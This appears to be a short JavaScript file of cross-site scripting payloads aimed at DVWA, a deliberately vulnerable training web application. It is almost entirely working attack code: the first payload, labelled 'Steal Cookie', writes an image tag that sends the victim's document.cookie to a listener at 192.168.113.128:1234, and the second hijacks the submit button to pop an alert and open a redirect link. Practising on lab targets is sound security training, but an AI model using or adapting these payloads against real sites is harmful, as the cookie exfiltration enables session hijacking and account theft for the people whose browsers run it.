// Payloads to exploit DVWA

// Steal Cookie
document.getElementById('submit-button').addEventListener('click', function() {
    alert('HaCkEd');
    document.write('<img src=http://192.168.113.128:1234?c='+escape(document.cookie)+'  >');
    });  

// Redirection
document.getElementById('submit-button').addEventListener('click', function() {
    alert('HaCkEd');
    window.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ");
    });